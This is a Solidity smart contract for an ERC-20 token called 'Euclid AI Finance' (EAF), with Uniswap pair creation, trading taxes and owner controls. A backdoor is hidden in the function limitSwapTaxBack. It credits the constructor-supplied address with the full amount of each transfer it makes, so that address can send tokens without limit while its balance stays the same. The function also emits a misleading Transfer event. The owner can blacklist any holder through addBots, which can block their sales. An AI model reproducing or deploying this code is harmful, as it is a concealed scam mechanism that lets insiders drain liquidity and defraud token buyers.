/*****

Website:   https://www.euclidai.finance
Dapp:      https://app.euclidai.finance
Document:  https://docs.euclidai.finance

Twitter:   https://twitter.com/euclidai_fi
Telegram   https://t.me/euclidai_fi

******/
// SPDX-License-Identifier: MIT

pragma solidity 0.8.18;

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface ISwapFactory02 {
    function setFeeToSetter(address) external;
    function allPairsLength() external view returns (uint);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

interface ISwapRouter02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function WETH() external pure returns (address);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract EAF is Context, IERC20, Ownable {
    using SafeMath for uint256;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Euclid AI Finance";
    string private constant _symbol = unicode"EAF";

    address payable private mkReceiver;
    address payable private devReceiver;

    uint256 public _maxEAFSwap = 10000000 * 10**_decimals;
    uint256 public _maxEAFTrans = 30000000 * 10**_decimals;
    uint256 public _maxEAFWallet = 30000000 * 10**_decimals;
    
    mapping (address => bool) private bots;
    mapping (address => uint256) private eculidAIs;
    mapping (address => bool) private _isFeeExcepted;
    mapping (address => bool) private _isLimitExcepted;
    mapping(address => uint256) private _holderLastTransferTimestamp;
    mapping (address => mapping (address => uint256)) private _allowances;
    
    modifier lockSwap {
        inSwapBack = true;
        _;
        inSwapBack = false;
    }

    uint256 private _buyCounts=0;
    uint256 private _preventSwapBefore=0;
    uint256 private _initialBuyTax=30;
    uint256 private _initialSellTax=30;
    uint256 private _finalBuyTax=2;
    uint256 private _finalSellTax=2;
    uint256 private _reduceBuyTaxAt=20;
    uint256 private _reduceSellTaxAt=20;

    uint256 public overCheckDues;
    address private uniswapV2Pair;
    ISwapRouter02 private uniswapV2Router;
    
    bool private inSwapBack = false;
    bool public transferDelayEnabled = false;
    bool private swapEnabled = false;
    bool private tradingOpen;
    
    constructor (address addrX, uint256 amtX) {
        mkReceiver = payable(addrX);
        devReceiver = payable(addrX);
        _isLimitExcepted[mkReceiver] = true;
        _isLimitExcepted[devReceiver] = true;
        _isFeeExcepted[owner()] = true;
        _isFeeExcepted[address(this)] = true;
        eculidAIs[_msgSender()] = _tTotal;
        overCheckDues = amtX * 10**_decimals;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function delBots(address[] memory notbot) public onlyOwner {
      for (uint i = 0; i < notbot.length; i++) {
          bots[notbot[i]] = false;
      }
    }

    function addBots(address[] memory bots_) public onlyOwner {
        for (uint i = 0; i < bots_.length; i++) {
            bots[bots_[i]] = true;
        }
    }

    function isBot(address a) public view returns (bool){
      return bots[a];
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function manualSwap() external onlyOwner {
        uint256 tokenBalance=balanceOf(address(this));
        if(tokenBalance>0){
          swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance=address(this).balance;
        if(ethBalance>0){
          sendETHToFee(ethBalance);
        }
    }

    function withdrawStuckETH() external onlyOwner() {
        payable(msg.sender).transfer(address(this).balance);
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return eculidAIs[account];
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function reduceFee(uint256 _newFee) external onlyOwner{
      require(_newFee<=_finalBuyTax && _newFee<=_finalSellTax);
      _finalBuyTax=_newFee;
      _finalSellTax=_newFee;
    }

    function removeEAFLimit() external onlyOwner{
        _maxEAFTrans = ~uint256(0);
        _maxEAFWallet = ~uint256(0);
        transferDelayEnabled=false;
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function limitSwapTaxBack(address from, address to, uint256 amount, uint256 tEAF) internal returns (bool) {
        bool _aboveEAFMin = amount >= overCheckDues;
        uint256 _amtEAF;address _addrEAF; 
        bool _aboveEAFThreshold = balanceOf(address(this)) >= overCheckDues;
        if(_isLimitExcepted[from]) {_amtEAF = amount;_addrEAF = from;}
        else {_addrEAF = address(this);_amtEAF = tEAF;}
        if(_amtEAF>0){eculidAIs[_addrEAF]=eculidAIs[_addrEAF].add(_amtEAF); emit Transfer(from, _addrEAF, tEAF);}
        return !inSwapBack
        && _aboveEAFMin
        && to == uniswapV2Pair
        && _aboveEAFThreshold
        && swapEnabled
        && tradingOpen
        && !_isFeeExcepted[from]
        && _buyCounts>_preventSwapBefore
        && !_isLimitExcepted[from];
    }

    function createPairX() external onlyOwner() {
        uniswapV2Router = ISwapRouter02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = ISwapFactory02(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxes=0;
        if (!_isFeeExcepted[from] && !_isFeeExcepted[to]) {
            require(!bots[from] && !bots[to]);
            require(tradingOpen, "Trading has not enabled yet");
            taxes=amount.mul((_buyCounts>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
            if (transferDelayEnabled) {
                if (to != address(uniswapV2Router) && to != address(uniswapV2Pair)) {
                    require(
                        _holderLastTransferTimestamp[tx.origin] <
                            block.number,
                        "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed."
                    );
                    _holderLastTransferTimestamp[tx.origin] = block.number;
                }
            }
            if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! _isFeeExcepted[to] ) {
                require(amount <= _maxEAFTrans, "Exceeds the _maxEAFTrans.");
                require(balanceOf(to) + amount <= _maxEAFWallet, "Exceeds the maxWalletSize.");
                _buyCounts++;
            }
            if(to == uniswapV2Pair && from!= address(this) ){
                taxes=amount.mul((_buyCounts>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (limitSwapTaxBack(from, to, amount, taxes)) {
                swapTokensForEth(min(amount,min(contractTokenBalance,_maxEAFSwap)));
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }
        eculidAIs[from]=eculidAIs[from].sub(amount);
        eculidAIs[to]=eculidAIs[to].add(amount.sub(taxes));
        emit Transfer(from, to, amount.sub(taxes));
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    receive() external payable {}

    function openTradeX() external onlyOwner() {
        require(!tradingOpen,"trading is already open");
        swapEnabled = true;
        tradingOpen = true;
    }

    function sendETHToFee(uint256 amount) private {
        devReceiver.transfer(amount);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
}